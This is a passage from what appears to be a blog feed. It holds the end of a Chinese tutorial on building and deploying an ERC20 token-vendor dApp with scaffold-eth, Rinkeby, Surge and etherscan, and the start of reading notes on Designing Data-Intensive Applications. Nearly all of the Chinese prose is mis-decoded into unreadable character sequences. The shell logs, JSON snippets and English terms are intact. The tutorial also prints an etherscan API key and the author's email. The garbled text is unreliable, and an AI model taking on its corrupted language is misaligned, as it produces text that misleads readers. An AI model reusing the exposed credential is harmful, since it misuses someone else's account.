id="bu-shu-he-yue">éƒ¨ç½²åˆçº¦</span></h3><p>æˆ‘ä»¬å†æ¬¡éƒ¨ç½²æ–°çš„åˆçº¦ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">$ yarn deploy --reset</span><br><span class="line"><span class="title class_">Compiling</span> <span class="number">7</span> files <span class="keyword">with</span> <span class="number">0.8</span><span class="number">.6</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Generating</span> typings <span class="attr">for</span>: <span class="number">7</span> artifacts <span class="keyword">in</span> <span class="attr">dir</span>: ../vite-app-ts/src/generated/contract-types <span class="keyword">for</span> <span class="attr">target</span>: ethers-v5</span><br><span class="line"><span class="title class_">Successfully</span> generated <span class="number">15</span> typings!</span><br><span class="line"><span class="title class_">Compilation</span> finished successfully</span><br><span class="line">deploying <span class="string">&quot;YourToken&quot;</span> (<span class="attr">tx</span>: <span class="number">0xd087814faeb6a8f1a7205d443550419b68d252bcd071e30c7965844105b761ac</span>)...: deployed at <span class="number">0x68B1D87F95878fE05B998F19b66F4baba5De1aed</span> <span class="keyword">with</span> <span class="number">639137</span> gas</span><br><span class="line">deploying <span class="string">&quot;Vendor&quot;</span> (<span class="attr">tx</span>: <span class="number">0xafaf257948f8c87e0a836eac6e2bbc1ec38026a5c2a0dfc0f71823a4ace635fd</span>)...: deployed at <span class="number">0x3Aa5ebB10DC797CAC828524e59A333d0A371443c</span> <span class="keyword">with</span> <span class="number">694098</span> gas</span><br><span class="line"></span><br><span class="line"> ğŸµ  <span class="title class_">Sending</span> all <span class="number">1000</span> tokens to the vendor...</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œåˆçº¦åœ°å€å˜ä¸ºï¼š</p><ul><li>æ‰¿é”€å•†åˆçº¦åœ°å€ï¼š <code>0x3Aa5ebB10DC797CAC828524e59A333d0A371443c</code></li><li>ä»£å¸åœ°å€ï¼š <code>0x68B1D87F95878fE05B998F19b66F4baba5De1aed</code></li></ul><h3><span id="yan-zheng">éªŒè¯</span></h3><p>éªŒè¯è¿‡ç¨‹éœ€è¦åŒ…å«ä¸¤æ­¥ï¼š</p><ol><li><p>å…ˆåœ¨ Debug é¡µé¢ä½¿ç”¨ä»£å¸çš„ <code>approve</code> å…è®¸æ‰¿é”€å•†åˆçº¦å¤„ç† 10 ä¸ªä»£å¸ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/155913525-657975ef-e67c-4df6-bf03-36eff6801d7e.png" alt="approve"></p><p>åœ¨ <code>ç¼–è¾‘æƒé™</code> ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°æˆæƒçš„ä»£å¸æ•°é‡ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/155913530-117ea47b-8000-4f8c-be5c-cd21a118ed04.png" alt="approveAmount"></p></li><li><p>ä½¿ç”¨æ‰¿é”€å•†çš„ <code>sellTokens</code> å°† 10 ä¸ªä»£å¸æ¢æˆ ETHã€‚å¦‚æœä¸Šä¸€æ­¥æ²¡æœ‰ä½¿ç”¨ <code>approve</code> çš„è¯ï¼Œç¨‹åºä¼šæŠ¥é”™ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/155913537-c085ad8b-295b-42b8-8755-ae9a43eec4e9.png" alt="sellTokens"></p></li></ol><p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†åˆçº¦çš„ç¼–å†™ã€‚</p><h2><span id="wu-bu-shu-dao-ce-shi-wang-luo">äº”ã€éƒ¨ç½²åˆ°æµ‹è¯•ç½‘ç»œ</span></h2><p>æˆ‘ä»¬å°†éƒ¨ç½²åˆçº¦åˆ°æµ‹è¯•ç½‘ç»œä¸­ï¼Œä½¿ç”¨çš„æµ‹è¯•ç½‘ç»œæ˜¯ <code>rinkeby</code> ï¼š</p><ol><li>ä¿®æ”¹ä»¥ä¸‹å˜é‡ä¸º <code>rinkeby</code> ï¼š<ol><li><code>packages/hardhat-ts/hardhat.config.ts</code> çš„ <code>defaultNetwork</code> å˜é‡ï¼Œ</li><li><code>packages/vite-app-ts/src/config/providersConfig.ts</code> ä¸­çš„ <code>targetNetworkInfo</code> å˜é‡</li></ol></li><li>æŸ¥çœ‹å¯ç”¨è´¦æˆ·ï¼š <code>yarn account</code> ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯ç”¨è´¦æˆ·ï¼Œåˆ™ä½¿ç”¨ <code>yarn generate</code> ç”Ÿæˆï¼›</li><li>ä½¿ç”¨ <a href="https://faucet.paradigm.xyz/">faucet.paradigm.xyz</a> è·å–ä¸€äº›æµ‹è¯•ç”¨çš„çš„ ETHï¼Œå¯ä»¥ä½¿ç”¨å¯¹åº”çš„åŒºå—æµè§ˆå™¨æŸ¥çœ‹è´¦æˆ·æƒ…å†µï¼Œæ¯”å¦‚ <a href="https://rinkeby.etherscan.io/">https://rinkeby.etherscan.io/</a>ï¼Œå½“æˆ‘ä»¬å®Œæˆæµ‹è¯•ç”¨å¸çš„ç”³è¯·ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è´¦æˆ·ä½™é¢ä¸º 0.1ETHï¼›</li><li>å†æ¬¡ä½¿ç”¨ <code>yarn deploy</code> è¿›è¡Œåˆçº¦éƒ¨ç½²ï¼š</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn deploy</span><br><span class="line">Nothing to compile</span><br><span class="line">No need to generate any newer typings.</span><br><span class="line">deploying <span class="string">&quot;YourToken&quot;</span> (tx: 0xa7a89a2917cfa355d1305643dc89f54d776186c0059977b0a237737fa37dff62)...: deployed at 0x0F0D10eF3589cE896E9E54E09568cB7a5371e398 with 639137 gas</span><br><span class="line">deploying <span class="string">&quot;Vendor&quot;</span> (tx: 0x3a1f02b77de29704a16599067c8e10abb0da78e547ea0eea8200761da5d45715)...: deployed at 0xb335Fc61D759C041503dC17266575229E593DE17 with 694098 gas</span><br><span class="line"></span><br><span class="line"> ğŸµ  Sending all 1000 tokens to the vendor...</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåˆçº¦éƒ¨ç½²æˆåŠŸï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥åœ¨çº¿ä¸Šæµ‹è¯•ç½‘ç»œæŸ¥çœ‹åˆ°å…·ä½“çš„åˆçº¦éƒ¨ç½²æƒ…å†µï¼š</p><ul><li>GLD åˆçº¦åœ°å€ï¼š<a href="https://rinkeby.etherscan.io/address/0x0F0D10eF3589cE896E9E54E09568cB7a5371e398">https://rinkeby.etherscan.io/address/0x0F0D10eF3589cE896E9E54E09568cB7a5371e398</a></li><li>æ‰¿é”€å•†åˆçº¦åœ°å€ï¼š <a href="https://rinkeby.etherscan.io/address/0xb335Fc61D759C041503dC17266575229E593DE17">https://rinkeby.etherscan.io/address/0xb335Fc61D759C041503dC17266575229E593DE17</a></li></ul><p>å¹¶ä¸”éƒ¨ç½²å®Œæˆäº†åˆå§‹åŒ–ä»£å¸åˆ†å‘å’Œæ‰€æœ‰æƒè½¬æ¢ã€‚è¯¦æƒ…å¯ä»¥æŸ¥çœ‹éƒ¨ç½²è´¦æˆ·ä¿¡æ¯ï¼š <a href="https://rinkeby.etherscan.io/address/0xccb20d43f62f31dd94436f04a1e90d7d08569e57">https://rinkeby.etherscan.io/address/0xccb20d43f62f31dd94436f04a1e90d7d08569e57</a>ã€‚</p><h2><span id="liu-fa-bu">å…­ã€å‘å¸ƒ</span></h2><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å‘å¸ƒæˆ‘ä»¬çš„å‰ç«¯é¡¹ç›®åˆ° Surge ï¼ˆæˆ–è€…ä½¿ç”¨ s3ï¼Œ ipfs ä¸Šï¼‰ã€‚<a href="http://Surge.sh">Surge.sh</a> æä¾›äº†å…è´¹çš„ç½‘ç«™çš„éƒ¨ç½²ï¼Œå¯¹äºæˆ‘ä»¬çš„æµ‹è¯•ç½‘ç«™æ¥æ—¶å†åˆé€‚ä¸è¿‡ã€‚</p><ol><li>ç¼–è¯‘å‰ç«¯é¡¹ç›®ï¼š <code>yarn build</code></li><li>å°†é¡¹ç›®å‘å¸ƒåˆ° surge ä¸Šï¼š <code>yarn surge</code></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn surge</span><br><span class="line"></span><br><span class="line">   Welcome to surge! (surge.sh)</span><br><span class="line">   Login (or create surge account) by entering email &amp; password.</span><br><span class="line"></span><br><span class="line">          email: qwh005007@gmail.com</span><br><span class="line">       password: </span><br><span class="line"></span><br><span class="line">   Running as qwh005007@gmail.com (Student)</span><br><span class="line"></span><br><span class="line">        project: ./dist</span><br><span class="line">         domain: qiwihui-scaffold-2.surge.sh</span><br><span class="line">         upload: [====================] 100% eta: 0.0s (83 files, 16080214 bytes)</span><br><span class="line">            CDN: [====================] 100%</span><br><span class="line">     encryption: *.surge.sh, surge.sh (57 days)</span><br><span class="line">             IP: 138.197.235.123</span><br><span class="line"></span><br><span class="line">   Success! - Published to qiwihui-scaffold-2.surge.sh</span><br></pre></td></tr></table></figure><p>Surge åœ¨è¿è¡Œå‘½ä»¤çš„è¿‡ç¨‹ä¸­å°±è®¾ç½®äº†è´¦æˆ·åç§°ï¼Œä»¥åŠå¯ä»¥è‡ªå®šä¹‰åŸŸåï¼š<a href="http://qiwihui-scaffold-2.surge.sh">qiwihui-scaffold-2.surge.sh</a>ï¼Œå½“å®Œæˆéƒ¨ç½²ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œå’Œæˆ‘ä»¬æœ¬åœ°è¿è¡Œçš„ç»“æœæ˜¯ä¸€è‡´çš„ã€‚</p><h2><span id="qi-he-yue-yan-zheng">ä¸ƒã€åˆçº¦éªŒè¯</span></h2><p>å½“æˆ‘ä»¬å‘æµ‹è¯•ç½‘ç»œéƒ¨ç½²åˆçº¦æ—¶ï¼Œéƒ¨ç½²çš„æ˜¯åˆçº¦ç¼–è¯‘ä¹‹åçš„å­—èŠ‚ç ï¼Œåˆçº¦æºç ä¸ä¼šå‘å¸ƒã€‚å®é™…ç”Ÿäº§ä¸­ï¼Œæœ‰æ—¶æˆ‘ä»¬éœ€è¦å‘å¸ƒæˆ‘ä»¬çš„æºä»£ç ï¼Œä»¥ä¿è¯æˆ‘ä»¬çš„ä»£ç çœŸå®å¯ä¿¡ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ© etherscan æä¾›çš„åŠŸèƒ½è¿›è¡ŒéªŒè¯ã€‚</p><ol><li><p>é¦–å…ˆï¼Œæˆ‘ä»¬è·å– etherscan çš„ API keyï¼Œåœ°å€ä¸º <a href="https://etherscan.io/myapikey">https://etherscan.io/myapikey</a>ï¼Œæ¯”å¦‚ <code>PSW8C433Q667DVEX5BCRMGNAH9FSGFZ7Q8</code> ï¼›</p></li><li><p>æ›´æ–° <code>packages/hardhat-ts/package.json</code> ä¸­å¯¹åº”çš„ api-key å‚æ•°ï¼š</p> <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="attr">&quot;send&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat send&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;generate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat generate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat account&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;etherscan-verify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hardhat etherscan-verify --api-key PSW8C433Q667DVEX5BCRMGNAH9FSGFZ7Q8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>ç”±äºé¡¹ç›®ä¸­çš„ä¸€ä¸ª bugï¼Œéœ€è¦åœ¨æ ¹ç›®å½•ä¸‹çš„ <code>packages.json</code> ä¸­æ·»åŠ ä»¥ä¸‹å‘½ä»¤æ‰èƒ½ç›´æ¥ä½¿ç”¨ä¹‹åçš„å‘½ä»¤ï¼š</p> <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;verify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yarn workspace @scaffold-eth/hardhat etherscan-verify&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure></li><li><p>è¿è¡Œ <code>yarn verify --network rinkeby</code> ï¼Œè¿™ä¸ªå‘½ä»¤å°†é€šè¿‡ etherscan æ¥å£è¿›è¡Œåˆçº¦éªŒè¯ï¼Œè¾“å‡ºç»“æœä¸ºï¼š</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn verify --network rinkeby</span><br><span class="line">verifying Vendor (0xb335Fc61D759C041503dC17266575229E593DE17) ...</span><br><span class="line">waiting <span class="keyword">for</span> result...</span><br><span class="line"> =&gt; contract Vendor is now verified</span><br><span class="line">verifying YourToken (0x0F0D10eF3589cE896E9E54E09568cB7a5371e398) ...</span><br><span class="line">waiting <span class="keyword">for</span> result...</span><br><span class="line"> =&gt; contract YourToken is now verified</span><br></pre></td></tr></table></figure></li><li><p>éªŒè¯å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° etherscan ä¸­çš„åˆçº¦é¡µé¢å·²ç»åŠ ä¸Šäº†ä¸€ä¸ªè“è‰²å°é’©ï¼Œåœ¨åˆçº¦ä¸­ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åˆçº¦çš„æºä»£ç ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/155913533-362162f2-eede-47f6-9c97-6f6e34bc9a70.png" alt="contractVerified"></p></li></ol><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†åˆçº¦çš„éªŒè¯ã€‚</p><h2><span id="ba-ti-jiao-jie-guo">å…«ã€æäº¤ç»“æœ</span></h2><p>æœ€åï¼Œå½“æˆ‘ä»¬å®Œæˆä¸Šè¿°çš„æ‰€æœ‰æ­¥éª¤ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬çš„ç»“æœæäº¤åˆ° <a href="https://speedrunethereum.com/">speedrunethereum.com</a> ä¸Šï¼Œé€‰æ‹©å¯¹åº”çš„æŒ‘æˆ˜ï¼Œå¹¶æäº¤éƒ¨ç½²çš„å‰ç«¯åœ°å€å’Œæ‰¿é”€å•†åˆçº¦çš„é“¾æ¥å³å¯ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/155913539-e7c60b5c-261d-488d-a517-0218bf415aa5.png" alt="submitChallenge"></p><p>Congratulations! ä½ å·²ç»å®Œæˆäº†è¿™ä¸ªæ•™ç¨‹</p><h2><span id="zong-jie">æ€»ç»“</span></h2><p>é€šè¿‡ç¯‡æ•™ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å­¦ä¹ åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><ol><li>åˆçº¦ <code>approve</code> å’Œ <code>transferFrom</code> çš„ä½¿ç”¨ï¼›</li><li>å¦‚ä½•ä½¿ç”¨ OpenZeppelin åˆ›å»º ERC20 ä»£å¸ï¼›</li><li>åˆ›å»ºæ‰¿é”€å•†åˆçº¦å®ç°ç”¨æˆ·å¯¹ä»£å¸çš„ä¹°å–ï¼›</li><li>åœ¨æµ‹è¯•ç½‘è·¯ Rinkeby ä¸Šéƒ¨ç½²åˆçº¦ï¼›</li><li>åœ¨ <a href="http://Surge.sh">Surge.sh</a> ä¸Šéƒ¨ç½²å‰ç«¯é¡¹ç›®ï¼›</li><li>åœ¨ etherscan ä¸ŠæŸ¥çœ‹åˆçº¦ä»¥åŠéªŒè¯åˆçº¦ï¼›</li><li>ä»¥åŠå…³äº web3 å¼€å‘çš„çŸ¥è¯†ï¼ŒåŒ…æ‹¬ hardhatï¼Œreact ç­‰ã€‚</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¦‚ä½•åˆ›å»ºä¸€ä¸ªä»£å¸æ‰¿é”€å•† dApp
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šæ•°æ®å¯†é›†å‹åº”ç”¨çš„è®¾è®¡ã€‹è¯»ä¹¦ç¬”è®°â”€â”€ç¬¬ä¸€ç« ï¼šå¯é æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯ç»´æŠ¤æ€§</title>
    <link href="https://qiwihui.com/qiwihui-blog-143/"/>
    <id>https://qiwihui.com/qiwihui-blog-143/</id>
    <published>2024-05-15T02:25:31.339Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="di-yi-zhang-ke-kao-xing-ke-kuo-zhan-xing-ke-wei-hu-xing">ç¬¬ä¸€ç« ï¼šå¯é æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯ç»´æŠ¤æ€§</span></h1><p>æ•°æ®å¯†é›†å‹ï¼ˆdata-intensiveï¼‰è€Œéè®¡ç®—å¯†é›†å‹ï¼ˆcompute-intensiveï¼‰ï¼š</p><ul><li>æ•°æ®é‡ã€æ•°æ®å¤æ‚æ€§ã€ä»¥åŠæ•°æ®çš„å˜æ›´é€Ÿåº¦</li><li>æ•°æ®å¯†é›†å‹åº”ç”¨åŸºæœ¬ç»„ä»¶<ul><li>å­˜å‚¨æ•°æ®ï¼Œä»¥ä¾¿è‡ªå·±æˆ–å…¶ä»–åº”ç”¨ç¨‹åºä¹‹åèƒ½å†æ¬¡æ‰¾åˆ° ï¼ˆ<strong><em>æ•°æ®åº“ï¼ˆdatabaseï¼‰</em></strong>ï¼‰</li><li>è®°ä½å¼€é”€æ˜‚è´µæ“ä½œçš„ç»“æœï¼ŒåŠ å¿«è¯»å–é€Ÿåº¦ï¼ˆ<strong><em>ç¼“å­˜ï¼ˆcacheï¼‰</em></strong>ï¼‰</li><li>å…è®¸ç”¨æˆ·æŒ‰å…³é”®å­—æœç´¢æ•°æ®ï¼Œæˆ–ä»¥å„ç§æ–¹å¼å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼ˆ<strong><em>æœç´¢ç´¢å¼•ï¼ˆsearch indexesï¼‰</em></strong>ï¼‰</li><li>å‘å…¶ä»–è¿›ç¨‹å‘é€æ¶ˆæ¯ï¼Œè¿›è¡Œå¼‚æ­¥å¤„ç†ï¼ˆ<strong><em>æµå¤„ç†ï¼ˆstream processingï¼‰</em></strong>ï¼‰</li><li>å®šæœŸå¤„ç†ç´¯ç§¯çš„å¤§æ‰¹é‡æ•°æ®ï¼ˆ<strong><em>æ‰¹å¤„ç†ï¼ˆbatch processingï¼‰</em></strong>ï¼‰</li></ul></li><li>ä¸€ä¸ªå¯èƒ½çš„ç»„åˆä½¿ç”¨å¤šä¸ªç»„ä»¶çš„æ•°æ®ç³»ç»Ÿæ¶æ„ï¼š</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/125434927-f4ac7199-069a-4bd5-8ed8-b5748a1b97da.png" alt="Untitled"></p><p>å½±å“æ•°æ®ç³»ç»Ÿè®¾è®¡çš„å› ç´ å¾ˆå¤šï¼ŒåŒ…æ‹¬å‚ä¸äººå‘˜çš„æŠ€èƒ½å’Œç»éªŒã€å†å²é—ç•™é—®é¢˜ã€ç³»ç»Ÿè·¯å¾„ä¾èµ–ã€äº¤ä»˜æ—¶é™ã€å…¬å¸çš„é£é™©å®¹å¿åº¦ã€ç›‘ç®¡çº¦æŸç­‰ã€‚</p><p>é‡è¦çš„ä¸‰ä¸ªé—®é¢˜ï¼›</p><ul><li><p><strong><em>å¯é æ€§ï¼ˆReliabilityï¼‰</em></strong></p><p>ç³»ç»Ÿåœ¨<strong>å›°å¢ƒï¼ˆadversityï¼‰</strong>ï¼ˆç¡¬ä»¶æ•…éšœã€è½¯ä»¶æ•…éšœã€äººä¸ºé”™è¯¯ï¼‰ä¸­ä»å¯æ­£å¸¸å·¥ä½œï¼ˆæ­£ç¡®å®ŒæˆåŠŸèƒ½ï¼Œå¹¶èƒ½è¾¾åˆ°æœŸæœ›çš„æ€§èƒ½æ°´å‡†ï¼‰ã€‚</p></li><li><p><strong><em>å¯æ‰©å±•æ€§ï¼ˆScalabilityï¼‰</em></strong></p><p>æœ‰åˆç†çš„åŠæ³•åº”å¯¹ç³»ç»Ÿçš„å¢é•¿ï¼ˆæ•°æ®é‡ã€æµé‡ã€å¤æ‚æ€§ï¼‰ã€‚</p></li><li><p><strong><em>å¯ç»´æŠ¤æ€§ï¼ˆMaintainabilityï¼‰</em></strong></p><p>éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè®¸å¤šæ–°çš„äººå‘˜å‚ä¸åˆ°ç³»ç»Ÿå¼€å‘å’Œè¿ç»´ï¼Œ ä»¥ç»´æŠ¤ç°æœ‰åŠŸèƒ½æˆ–é€‚é… æ–°åœºæ™¯ç­‰ï¼Œç³»ç»Ÿéƒ½åº”é«˜æ•ˆè¿è½¬ã€‚</p></li></ul><h2><span id="ke-kao-xing">å¯é æ€§</span></h2><p>æœŸæœ›:</p><ul><li>åº”ç”¨ç¨‹åºæ‰§è¡Œç”¨æˆ·æ‰€æœŸæœ›çš„åŠŸèƒ½ã€‚</li><li>å¯ä»¥å®¹å¿ç”¨æˆ·å‡ºç°é”™è¯¯æˆ–è€…ä¸æ­£ç¡®çš„è½¯ä»¶ä½¿ç”¨æ–¹æ€¯ ã€‚</li><li>æ€§èƒ½å¯ä»¥åº”å¯¹å…¸å‹åœº æ™¯ ã€ åˆ ç†è´Ÿè½½å‹åŠ›å’Œæ•°æ® é‡ã€‚</li><li>ç³»ç»Ÿå¯é˜²æ­¢ä»»ä½•æœªç»æˆæƒçš„è®¿é—®å’Œæ»¥ç”¨ã€‚</li></ul><p>æ•…éšœï¼ˆfaultï¼‰å’Œå¤±æ•ˆï¼ˆfailureï¼‰ï¼š</p><ul><li>æ•…éšœï¼šç³»ç»Ÿçš„ä¸€éƒ¨åˆ†çŠ¶æ€åç¦»å…¶æ ‡å‡†ï¼›</li><li>å¤±æ•ˆï¼šç³»ç»Ÿä½œä¸ºä¸€ä¸ªæ•´ä½“åœæ­¢å‘ç”¨æˆ·æä¾›æœåŠ¡ã€‚</li><li>ç”±äºå‡ºç°faultçš„å‡ ç‡ä¸å¯èƒ½ä¸º0ï¼Œå› æ­¤å€¾å‘äºè®¾è®¡fault-tolerantè€Œä¸æ˜¯fault-preventingçš„ç³»ç»Ÿã€‚</li></ul><h3><span id="ying-jian-gu-zhang">ç¡¬ä»¶æ•…éšœ</span></h3><ul><li>éšæœºçš„ã€ç›¸äº’ç‹¬ç«‹çš„</li><li>è®¡ç®—æœºç³»ç»Ÿä¸­çš„ç¡¬ç›˜ã€å†…å­˜ã€power gridç­‰é›¶ä»¶éƒ½å¯èƒ½å‡ºé—®é¢˜ï¼Œè¿™å¯ä»¥é€šè¿‡å¢åŠ å•ä¸ªç¡¬ä»¶çš„å†—ä½™åº¦ï¼ˆredundancyï¼‰æ¥å‡å°‘æ•´ä¸ªç³»ç»Ÿå®•æœºçš„æ¦‚ç‡ï¼›</li><li>éšç€æ•°æ®é‡å’Œåº”ç”¨è®¡ç®—éœ€æ±‚çš„å¢åŠ ï¼Œå¢åŠ è®¾å¤‡å†—ä½™ä¹Ÿæ— æ³•è§£å†³ï¼Œå°±éœ€è¦è€ƒè™‘å¦‚ä½•åœ¨æŸä¸ªæœºå™¨å®•æœºçš„æƒ…å†µä¸‹é€šè¿‡è½¯ä»¶è°ƒåº¦æ¥é˜²æ­¢æ•´ä¸ªæœåŠ¡å´©æºƒã€‚</li></ul><h3><span id="ruan-jian-gu-zhang">è½¯ä»¶æ•…éšœ</span></h3><ul><li>ç³»ç»Ÿæ€§é”™è¯¯çš„BUGéš¾ä»¥é¢„æ–™ï¼Œé€šå¸¸åœ¨å¼‚å¸¸æƒ…å†µè¢«è§¦å‘ï¼Œä¾‹å¦‚Linuxå†…æ ¸çš„æ¶¦ç§’BUGï¼›</li><li>æ²¡æœ‰å¿«é€Ÿè§£å†³åŠæ³•ï¼Œåªèƒ½åœ¨å®ç°æ—¶ï¼š<ul><li>è®¤çœŸæ£€æŸ¥ä¾èµ–çš„å‡è®¾æ¡ä»¶ä¸ç³»ç»Ÿä¹‹é—´äº¤äº’</li><li>è¿›è¡Œå…¨é¢çš„æµ‹è¯•</li><li>è¿›ç¨‹éš”ç¦»</li><li>å…è®¸è¿›ç¨‹å´©æ„¤å¹¶è‡ªåŠ¨é‡å¯</li><li>åå¤è¯„ä¼°</li><li>ç›‘æ§äº•åˆ†æç”Ÿäº§ç¯èŠ‚çš„è¡Œä¸ºè¡¨ç°</li></ul></li></ul><h3><span id="ren-wei-gu-zhang">äººä¸ºæ•…éšœ</span></h3><ul><li>äººç±»æ˜¯ä¸å¯é çš„ï¼Œæ“ä½œäººå‘˜çš„ä¸å½“æ“ä½œå ç³»ç»Ÿå´©æºƒçš„75%ï½90%</li><li>å¦‚ä½•é™ä½ï¼š<ul><li>ä»¥æœ€å°å‡ºé”™çš„æ–¹å¼æ¥è®¾è®¡ç³»ç»Ÿï¼›</li><li>æƒ³åŠä½åˆ†ç¦»æœ€å®¹æ˜“å‡ºé”™çš„åœ°æ–¹ã€å®¹æ˜“å¼•å‘æ•…éšœçš„æ¥å£ï¼Œæä¾›sandboxè®©ä»–ä»¬ç†Ÿæ‚‰ä½¿ç”¨æ–¹æ³•ï¼Œéšæ„çŠ¯é”™è€Œä¸ä¼šå½±å“ç”Ÿäº§ï¼›</li><li>å……åˆ†çš„æµ‹è¯•ï¼šunit/integration/manualï¼›</li><li>å½“å‡ºç°äººä¸ºå¤±è¯¯æ—¶ï¼Œæä¾›å¿«é€Ÿçš„æ¢å¤æœºåˆ¶ä»¥å°½é‡å‡å°‘æ•…éšœå½±å“ï¼›</li><li>è®¾ç½®è¯¦ç»†è€Œæ¸…æ™°çš„ç›‘æ§å­ç³»ç»Ÿï¼ŒåŒ…æ‹¬æ€§èƒ½æŒ‡æ ‡å’Œé”™è¯¯ç‡ï¼›</li><li>æ¨è¡Œç®¡ç†æµç¨‹äº•åŠ ä»¥åŸ¹è®­ã€‚</li></ul></li></ul><h2><span id="ke-kuo-zhan-xing"><strong><em>å¯æ‰©å±•æ€§</em></strong></span></h2><p>ç³»ç»Ÿä¸è§å¾—ä¸€ç›´å¯é ï¼Œæ¯”å¦‚è´Ÿè½½å¢åŠ ï¼Œç³»ç»Ÿéœ€è¦æŒç»­å˜åŒ–ã€‚</p><h3><span id="heng-liang-fu-zai-load">è¡¡é‡è´Ÿè½½ï¼ˆLoadï¼‰</span></h3><ul><li>æ ¹æ®ç³»ç»Ÿç‰¹æ€§ç®€æ´æè¿°ï¼Œä¾‹å¦‚æœåŠ¡å™¨çš„æ¯ç§’è¯·æ±‚å¤„ç†æ¬¡æ•°ï¼Œæ•°æ®åº“è¯»å†™æ¯”ä¾‹ï¼Œç”¨æˆ·æ•°é‡ï¼Œ ç¼“å­˜å‘½ä¸­ç‡</li><li>Twitterä¾‹å­<ul><li>éœ€æ±‚<ul><li>ç”¨æˆ·å‘æ¨(avg 4.6k RPSï¼Œmax 12k RPS)</li><li>æŸ¥çœ‹ä¸ªäººä¸»é¡µæ—¶é—´çº¿(300k RPS)</li></ul></li><li>æŒ‘æˆ˜ï¼šå¦‚ä½•å¿«é€Ÿä¸ºç”¨æˆ·æä¾›timelineã€‚<ol><li>ç›´æ¥ä»æ•°æ®åº“è¯»æŸ¥è¯¢ï¼Œæ¶‰åŠjoinï¼Œåœ¨è¯·æ±‚å¤šçš„æ—¶å€™æ•°æ®åº“æ— æ³•å¤„ç†ï¼›</li><li>è€ƒè™‘ä¸ºæ¯ä¸ªç”¨æˆ·ç»´æŠ¤æ—¶é—´çº¿çš„ç¼“å­˜ï¼Œåªæ˜¯å‘æ¨çš„æ—¶å€™å°±éœ€è¦æ›´æ–°å¯¹åº”ç”¨æˆ·çš„ç¼“å­˜ï¼›</li><li>æ··åˆï¼šç”±äºå‘æ¨çš„RPSè¿œå°äºæŸ¥è¯¢ï¼Œç¼“å­˜çš„æ–¹æ³•å¯¹è¯»æ›´æœ‰ä¼˜åŠ¿ï¼Œä½†æ˜¯å¯¹äºfollowerä¼—å¤šçš„å¤§å·ï¼Œå‘æ¨éœ€è¦å†™å…¥çš„ç¼“å­˜å¯èƒ½éå¸¸å¤šï¼Œå› æ­¤å¯ä»¥è€ƒè™‘é’ˆå¯¹è¿™ç§å¤§å·ç›´æ¥å†™å…¥æ•°æ®åº“ï¼Œåœ¨æ—¶é—´çº¿å•ç‹¬ä»æ•°æ®åº“è¯»å¤§å·çš„æ¨ã€‚</li></ol></li></ul></li></ul><h3><span id="heng-liang-xing-neng-performance">è¡¡é‡æ€§èƒ½ï¼ˆPerformanceï¼‰</span></h3><ul><li>ä¸¤ä¸ªé—®é¢˜ï¼š<ul><li>å¢åŠ 